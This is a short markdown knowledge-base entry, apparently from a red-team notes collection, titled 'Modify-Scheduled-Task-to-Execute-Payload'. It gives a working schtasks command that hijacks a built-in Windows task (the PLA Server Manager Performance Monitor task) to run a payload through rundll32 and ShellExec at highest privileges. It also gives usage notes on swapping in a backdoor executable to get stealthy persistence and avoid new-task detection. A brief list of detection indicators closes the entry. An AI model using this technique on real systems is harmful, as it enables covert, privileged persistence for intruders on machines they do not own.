---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
  - backdoor
validated: true
---

# Modify-Scheduled-Task-to-Execute-Payload

## Code

```powershell
# Launch an executable by calling the ShellExec_RunDLL function.
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
```

## Description

This code modifies a built-in Windows task to execute a payload via rundll32 indirection and ShellExec, running at highest privileges for stealthy persistence.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "\Microsoft\Windows\PLA\..." | Target system task path | "\Microsoft\Windows\Defrag\ScheduledDefrag" |
| C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat | Payload execution (replace msiexec with backdoor) | C:\Temp\backdoor.exe |

## Usage

Run in cmd or PowerShell as admin to hijack the task. Replace payload path; triggers on original schedule. Useful for avoiding new task detection.

## Detection

- Changes to system tasks (Event ID 4703).
- rundll32.exe with SHELL32.DLL,ShellExec_RunDLLA arguments.
- msiexec.exe or unusual EXE spawns from tasks.

## Related

- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
- [[commands/schtasks-change-task-payload]]
